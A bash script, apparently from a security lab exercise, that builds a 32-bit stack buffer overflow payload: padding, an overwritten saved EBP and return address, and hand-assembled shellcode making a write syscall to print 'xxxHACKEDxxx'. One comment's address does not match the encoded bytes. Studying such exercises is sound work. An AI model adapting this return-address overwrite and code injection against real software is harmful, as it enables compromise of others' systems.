#!/bin/bash

# write 12 'A's to buff and its padding
perl -e 'print "A"x12;' > input.syswrite.txt

# write value 0xbfffefc8 to the saved EBP, to preserve the old EBP (actually not necessary)
perl -e 'print "\xc8\xef\xff\xbf";' >> input.syswrite.txt 

# write new return address 0xbfffe68
perl -e 'print "\xd0\xef\xff\xbf";' >> input.syswrite.txt

# write "xxxHACKEDxxx\0" to stack
perl -e 'print "xxxHACKEDxxx\0\0\0\0";' >> input.syswrite.txt

# inject "movl $12, %edx"
perl -e 'print "\xba\x0c\x00\x00\x00";' >> input.syswrite.txt

# inject "movl $0xbfffefc0,%ecx"
perl -e 'print "\xb9\xc0\xef\xff\xbf";' >> input.syswrite.txt

# inject "movl $1,%ebx"
perl -e 'print "\xbb\x01\x00\x00\x00";' >> input.syswrite.txt

# inject "movl $4,%eax"
perl -e 'print "\xb8\x04\x00\x00\x00";' >> input.syswrite.txt

# inject "int $0x80"
perl -e 'print "\xcd\x80";' >> input.syswrite.txt

